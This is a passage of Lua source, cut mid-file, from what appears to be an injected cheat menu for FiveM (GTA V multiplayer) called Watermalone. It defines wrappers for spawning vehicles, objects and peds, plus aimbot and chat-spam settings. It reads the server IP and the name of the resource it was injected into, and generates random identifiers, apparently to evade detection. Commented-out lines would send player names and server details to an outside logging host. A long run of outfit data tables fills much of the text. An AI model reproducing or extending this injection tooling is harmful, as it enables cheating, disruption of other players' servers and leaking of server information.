        end
    end

    wmlua.N.Renderer = {}
    local ScrW, ScrH = wmlua.N.GetResolution()

    function wmlua.N.Renderer:DrawRect(x, y, w, h, r, g, b, a)
        local _w, _h = w / ScrW, h / ScrH
        local _x, _y = x / ScrW + _w / 2, y / ScrH + _h / 2
        wmlua.H.WMInvokeNative(0x3A618A217E5154F0, _x, _y, _w, _h, r, g, b, a)
    end

    function wmlua.N.Renderer:DrawBounding(x, y, w, h, r, g, b, a)
        wmlua.N.Renderer:DrawRect(x, y, 1, h, r, g, b, a)
        wmlua.N.Renderer:DrawRect(x, y, w, 1, r, g, b, a)
        wmlua.N.Renderer:DrawRect(x + (w - 1), y, 1, h, r, g, b, a)
        wmlua.N.Renderer:DrawRect(x, (y - 1) + h, w, 1, r, g, b, a)
    end

    function wmlua.N.LoadResourceFile(res, file)
        return wmlua.H.WMInvokeNative(0x76A9EE1F, tostring(res), tostring(file), wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsString())
        --[[local fc = wmlua.B.wmGetFile("resources:/" .. res .. "//" .. file)
        if fc and #fc > 1 then
            return fc
        else
            return nil
        end]]
    end

    function wmlua.N.IsPedAPlayer(p1)
        return wmlua.H.WMInvokeNative(0x12534C348C6CB68B, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.GetResourceKvp(p1)
        return wmlua.H.WMInvokeNative(0x5240DA5A, p1, wmlua.H.ResultAsString())
    end

    function wmlua.N.SetResourceKvp(p1, p2)
        return wmlua.H.WMInvokeNative(0x21C7A35B, p1, p2, wmlua.H.ResultAsString())
    end
    
    --[[if wmlua.V.elq and wmlua.V.elq_last then
        repeat
            if wmlua.N.Get_GameTimer() < wmlua.V.elq_last + wmlua.V.elq then wmlua_Schleep(0) end
        until wmlua.N.Get_GameTimer() > wmlua.V.elq_last + wmlua.V.elq
        end]]

    function wmlua.N.SpawnVeh(p1,p2,p3,p4,p5,p6,p7)
        if not wmlua.N.HasModelLoaded(p1) then
            while not wmlua.N.HasModelLoaded(p1) do
                wmlua.N.RequestModel(p1)
                wmlua_Schleep(0)
            end
        end
        local spawn = false
        if wmlua.V.elq_last and wmlua.V.elq and wmlua.N.Get_GameTimer() > wmlua.V.elq_last + wmlua.V.elq or not wmlua.V.elq_last then
            spawn = true
        end
        if spawn then
            if wmlua.V.elq then wmlua.V.elq_last = wmlua.N.Get_GameTimer() end
            return wmlua.H.WMInvokeNative(0xAF35D0D2583051B0, p1,p2,p3,p4,p5,p6,p7, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
        else
            return nil
        end
    end

    function wmlua.N.SpawnObj(p1,p2,p3,p4,p5,p6,p7)
        if not wmlua.N.HasModelLoaded(p1) then
            while not wmlua.N.HasModelLoaded(p1) do
                wmlua.N.RequestModel(p1)
                wmlua_Schleep(0)
            end
        end
        local spawn = false
        if wmlua.V.elq_last and wmlua.V.elq and wmlua.N.Get_GameTimer() > wmlua.V.elq_last + wmlua.V.elq or not wmlua.V.elq_last then
            spawn = true
        end
        if spawn then
            if wmlua.V.elq then wmlua.V.elq_last = wmlua.N.Get_GameTimer() end
            return wmlua.H.WMInvokeNative(0x509D5878EB39E842, p1,p2,p3,p4,p5,p6,p7, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
        else
            return nil
        end
    end

    function wmlua.N.SpawnPed(p1,p2,p3,p4,p5,p6,p7,p8)
        if not wmlua.N.HasModelLoaded(p2) then
            while not wmlua.N.HasModelLoaded(p2) do
                wmlua.N.RequestModel(p2)
                wmlua_Schleep(0)
            end
        end
        local spawn = false
        if wmlua.V.elq_last and wmlua.V.elq and wmlua.N.Get_GameTimer() > wmlua.V.elq_last + wmlua.V.elq or not wmlua.V.elq_last then
            spawn = true
        end
        if spawn then
            return wmlua.H.WMInvokeNative(0xD49F9B0955C367DE, p1,p2,p3,p4,p5,p6,p7,p8, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
        else
            return nil
        end
    end

    function wmlua.N.GetIntDecor(p1,p2)
        return wmlua.H.WMInvokeNative(0xA06C969B02A97298, p1, p2, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.F.IsAsciiDecPresent(str)
        if string.find(str, "\\32") or string.find(str, "\\10") then
            return true
        else
            return false
        end
    end

    function wmlua.F.DecodeASCIIDec(str)

        wmlua.V.InitSTR = ""
        str = wmlua.F.Split(str, '\\')
        for k,v in pairs(str) do
            if type(tonumber(v)) == "number" then
                v = wmlua.utf8char(v)
            end
            wmlua.V.InitSTR = wmlua.V.InitSTR .. v
        end
        return wmlua.V.InitSTR

    end

    math.randomseed(1337+999+666+101*wmlua.N.Get_GameTimer())

    local wmlua2 = wmlua.S.GenerateString(2) .. "_" .. wmlua.S.GenerateString(20)

    wmlua.V.InputTESTR = wmlua.S.GenerateString(10)
    
    wmlua.API.loadEvent = wmlua.S.GenerateString(8)
    wmlua.API.wmEventLogger = wmlua.S.GenerateString(12)
    wmlua.API.wmConfigRetriever = wmlua.S.GenerateString(12)
    wmlua.API.wmConfigRetrieverInit = wmlua.S.GenerateString(12)

    wmlua.logoDict = wmlua.S.GenerateString(12)
    wmlua.logoSprite = wmlua.S.GenerateString(12)

    wmlua.menu = {}
    wmlua.menu.f = {}
    wmlua.menu.t = {}
    wmlua.menu.v = {}

    wmlua.menu.v.tabs_scroll_cur = 1
    wmlua.menu.v.tabs_scroll_max = 16
    wmlua.menu.v.buttons_scroll_cur = 1
    wmlua.menu.v.buttons_scroll_max = 16
    wmlua.menu.v.playerlist_scroll_cur = 1
    wmlua.menu.v.playerlist_scroll_max = 16

    wmlua.V.Lua_mousehandler = true
    wmlua.V.ImpactText = "*"
    wmlua.V.Aim_distance = 150
    wmlua.V.CAM_setfov = false
    wmlua.V.motion = 0
    wmlua.V.Aim_damage = 0

    wmlua.V.BuildDate = "11/24/2020"

    wmlua.V.Mis_infiniteroll = false
    wmlua.V.Mis_nocombatstance = false
    wmlua.S.ServerIP = wmlua.H.WMInvokeNative(0xEA11BFBA, wmlua.H.ResultAsString())
    wmlua.S.InjectedResource = wmlua.H.WMInvokeNative(0xE5E9EBBB, wmlua.H.ResultAsString())

    wmlua.I.EventLog = {}
    wmlua.T.TargetList = {}
    wmlua.T.Impacts = {}
    wmlua.T.Fires = {}
    wmlua.T.PossibleTargets = {}
    wmlua.T.Spikes = {}
    wmlua.T.LoadCalls = {}

    -- cid = clothing piece set, drawid = clothing item, textureid = color, paletteid = ??????????? no notice-able change.

    wmlua.T.Outfits = { -- wmlua.N.GetHashKey("mp_f_freemode_01") & wmlua.N.GetHashKey("mp_m_freemode_01")
        {name = "Default", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = { -- Just to allow them whatever
        }},
        {name = "Kyler", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = 55, textureid = 0, attached = true},
            {type = 1, label = "Glasses", cid = 1, drawid = 25, textureid = 3, attached = true},
            {type = 0, label = "Hair", cid = 2, drawid = 17, textureid = 1, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 9, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 15, textureid = 0, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 271, textureid = 8, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 26, textureid = 0, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 6, textureid = 1, paletteid = 0},
        }},
        {name = "Mario", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = 7, textureid = 4, attached = true},
            {type = 1, label = "Glasses", cid = 1, drawid = 0, textureid = 0, attached = true},
            {type = 0, label = "Hair", cid = 2, drawid = 4, textureid = 0, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 9, textureid = 0, paletteid = 1},
            {type = 0, label = "Mask", cid = 1, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 99, textureid = 8, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 15, textureid = 0, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 22, textureid = 2, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 90, textureid = 0, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 12, textureid = 0, paletteid = 0},
        }},
        {name = "Luigi", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = 7, textureid = 6, attached = true},
            {type = 1, label = "Glasses", cid = 1, drawid = 0, textureid = 0, attached = true},
            {type = 0, label = "Hair", cid = 2, drawid = 4, textureid = 0, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 9, textureid = 0, paletteid = 1},
            {type = 0, label = "Mask", cid = 1, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 99, textureid = 8, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 15, textureid = 0, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 1, textureid = 7, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 90, textureid = 0, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 12, textureid = 0, paletteid = 0},
        }},
        {name = "Slav", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = -1, textureid = 0, attached = false},
            {type = 1, label = "Glasses", cid = 1, drawid = 0, textureid = 0, attached = false},
            {type = 0, label = "Hair", cid = 2, drawid = 2, textureid = 0, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 44, textureid = 0, paletteid = 1},
            {type = 0, label = "Mask", cid = 1, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 12, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 15, textureid = 0, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 113, textureid = 2, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 55, textureid = 0, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 8, textureid = 2, paletteid = 0},
        }},
        {name = "Tron", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = 91, textureid = 9, attached = true},
            {type = 1, label = "Glasses", cid = 1, drawid = 17, textureid = 4, attached = true},
            {type = 0, label = "Hair", cid = 2, drawid = 3, textureid = 1, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 29, textureid = 0, paletteid = 1},
            {type = 0, label = "Mask", cid = 1, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 22, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 15, textureid = 0, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 178, textureid = 9, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 77, textureid = 9, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 55, textureid = 9, paletteid = 0},
        }},
        {name = "Classic Vito", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = 12, textureid = 1, attached = true},
            {type = 1, label = "Glasses", cid = 1, drawid = 17, textureid = 4, attached = true},
            {type = 0, label = "Hair", cid = 2, drawid = 3, textureid = 1, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 21, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 19, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 15, textureid = 9, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 242, textureid = 2, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 24, textureid = 5, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 20, textureid = 3, paletteid = 0},
        }},
        {name = "Classic Vito 2", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = 12, textureid = 1, attached = true},
            {type = 1, label = "Glasses", cid = 1, drawid = 17, textureid = 4, attached = true},
            {type = 0, label = "Hair", cid = 2, drawid = 3, textureid = 1, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 21, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 22, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 96, textureid = 9, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 29, textureid = 5, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 29, textureid = 12, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 24, textureid = 5, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 20, textureid = 3, paletteid = 0},
        }},
        {name = "Leopard Guy", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = 64, textureid = 6, attached = false},
            {type = 1, label = "Glasses", cid = 1, drawid = 5, textureid = 0, attached = false},
            {type = 0, label = "Hair", cid = 2, drawid = 13, textureid = 0, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 4, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = -1, textureid = 8, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 1, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 65, textureid = 1, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 35, textureid = 4, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 85, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 28, textureid = 12, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 9, textureid = 14, paletteid = 0},
        }},
        {name = "Basic Guy", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = 12, textureid = 0, attached = true},
            {type = 1, label = "Glasses", cid = 1, drawid = 17, textureid = 4, attached = true},
            {type = 0, label = "Hair", cid = 2, drawid = 3, textureid = 1, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 29, textureid = 0, paletteid = 1},
            {type = 0, label = "Mask", cid = 1, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 22, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 2, textureid = 2, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 76, textureid = 1, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 24, textureid = 0, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 10, textureid = 0, paletteid = 0},
        }},
        {name = "Basic Guy 2", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = 53, textureid = 0, attached = true},
            {type = 1, label = "Glasses", cid = 1, drawid = -1, textureid = 0, attached = true},
            {type = 0, label = "Hair", cid = 2, drawid = 3, textureid = 1, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 22, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 2, textureid = 2, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 6, textureid = 0, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 1, textureid = 2, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 7, textureid = 2, paletteid = 0},
        }},
        {name = "Basic Guy 3", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = -1, textureid = 0, attached = false},
            {type = 1, label = "Glasses", cid = 1, drawid = -1, textureid = 0, attached = true},
            {type = 0, label = "Hair", cid = 2, drawid = 2, textureid = 1, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 22, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 15, textureid = 2, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 90, textureid = 0, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 1, textureid = 1, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 12, textureid = 9, paletteid = 0},
        }},
        {name = "Basic Guy 4", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = -1, textureid = 0, attached = false},
            {type = 1, label = "Glasses", cid = 1, drawid = 0, textureid = 0, attached = false},
            {type = 0, label = "Hair", cid = 2, drawid = 2, textureid = 0, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 22, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 15, textureid = 0, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 14, textureid = 7, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 33, textureid = 1, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 39, textureid = 1, paletteid = 0},
        }},
        {name = "Basic Guy 5", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = -1, textureid = 0, attached = false},
            {type = 1, label = "Glasses", cid = 1, drawid = 0, textureid = 0, attached = false},
            {type = 0, label = "Hair", cid = 2, drawid = 2, textureid = 0, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 22, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 76, textureid = 1, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 62, textureid = 0, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 98, textureid = 23, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 46, textureid = 5, paletteid = 0},
        }},
        {name = "Terrorist", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = -1, textureid = 0, attached = false},
            {type = 1, label = "Glasses", cid = 1, drawid = 0, textureid = 0, attached = false},
            {type = 0, label = "Hair", cid = 2, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = 115, textureid = 6, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 75, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 15, textureid = 0, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 114, textureid = 0, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 56, textureid = 0, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 34, textureid = 0, paletteid = 0},
        }},
        {name = "Robber", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = -1, textureid = 0, attached = true},
            {type = 1, label = "Glasses", cid = 1, drawid = -1, textureid = 0, attached = true},
            {type = 0, label = "Hair", cid = 2, drawid = 3, textureid = 1, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = 54, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 24, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 5, textureid = 2, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 62, textureid = 0, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 1, textureid = 1, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 7, textureid = 2, paletteid = 0},
        }},
        {name = "Biker Guy", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = 5, textureid = 0, attached = true},
            {type = 1, label = "Glasses", cid = 1, drawid = 5, textureid = 0, attached = true},
            {type = 0, label = "Hair", cid = 2, drawid = 13, textureid = 3, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 20, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 48, textureid = 3, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 37, textureid = 2, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 76, textureid = 1, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 25, textureid = 0, paletteid = 0},
        }},
        {name = "XMAS", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = -1, textureid = 0, attached = false},
            {type = 1, label = "Glasses", cid = 1, drawid = 0, textureid = 0, attached = false},
            {type = 0, label = "Hair", cid = 2, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = 134, textureid = 16, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 10, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 15, textureid = 0, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 274, textureid = 16, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 106, textureid = 16, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 83, textureid = 16, paletteid = 0},
        }},
        {name = "Green Alien", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = -1, textureid = 0, attached = false},
            {type = 1, label = "Glasses", cid = 1, drawid = 0, textureid = 0, attached = false},
            {type = 0, label = "Hair", cid = 2, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = 134, textureid = 8, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 10, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 15, textureid = 0, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 274, textureid = 8, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 106, textureid = 8, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 83, textureid = 8, paletteid = 0},
        }},
        {name = "Purple Alien", model = wmlua.N.GetHashKey("mp_m_freemode_01"), components = {
            {type = 1, label = "Hat", cid = 0, drawid = -1, textureid = 0, attached = false},
            {type = 1, label = "Glasses", cid = 1, drawid = 0, textureid = 0, attached = false},
            {type = 0, label = "Hair", cid = 2, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Face", cid = 0, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Mask", cid = 1, drawid = 134, textureid = 9, paletteid = 0},
            {type = 0, label = "Arms", cid = 3, drawid = 10, textureid = 0, paletteid = 0},
            {type = 0, label = "T Shirt", cid = 8, drawid = 15, textureid = 0, paletteid = 0},
            {type = 0, label = "Torso", cid = 11, drawid = 274, textureid = 9, paletteid = 0},
            {type = 0, label = "Tie", cid = 7, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Bullet Proof Vest", cid = 9, drawid = 0, textureid = 0, paletteid = 0},
            {type = 0, label = "Pants", cid = 4, drawid = 106, textureid = 9, paletteid = 0},
            {type = 0, label = "Shoes", cid = 6, drawid = 83, textureid = 9, paletteid = 0},
        }},
    }

    function wmlua.LTD(hdr, msg, webhook)
        
        -- local str = 'http://auth.watermalone.net/a.php?header=' .. hdr .. '&message=' .. msg
        -- if webhook then str = str .. "&webhookurl=" .. webhook end
        -- local cock = wmlua.N.SetDuiUrl(wmlua.S.LogsDUI, str, 1, 1)
    
    end
    
    -- wmlua.S.LogsDUI = wmlua.N.CreateDUI('http://auth.watermalone.net/a.php?header=' .. wmlua.N.GetPlayerName(wmlua.N.PlayerId()) .. " (" .. wmlua.N.ScGetNickname() .. ")" .. '&message=' .. [[Initialized Watermalone > Server IP: ]] .. wmlua.S.ServerIP .. [[ RES: ]] .. wmlua.S.InjectedResource, 1, 1)

    wmlua.V.ShotsFired = 0
    wmlua.I.TCount = 0
    wmlua.V.Vis_impact_dt = 3000
    wmlua.V.OutFitIndex = 1
    wmlua.I.SSAbility = false

    wmlua.V.Lua_safemode = true

    wmlua.V.RC_preferfreecam = true

    wmlua.V.CHAT_spamrate = 25
    wmlua.V.CHAT_msgtype = "default"
    wmlua.V.CHAT_name = ""

    wmlua.INTEGERS = {
        0.3055,
    }

    wmlua.STRINGS = {
        "Player List | Page: ", -- 1
        " | ", -- 2 [seperator]
        "ID: ", -- 3
        " | M/F: ", -- 4
        " was pressed", -- 5
        " (", -- 6
        ")", -- 7
        " M)", -- 8
        "Invalid", -- 9
        "SKEL_Head", -- 10
        "SKEL_Spine2", -- 11
        "Head", -- 12
        "Body", -- 13
        "+", -- 14
        "~g~", -- 15
        "~r~", -- 16
        "~b~", -- 17
        "~", -- 18
        "", -- 19
        " ", -- 20
        "%W", -- 21
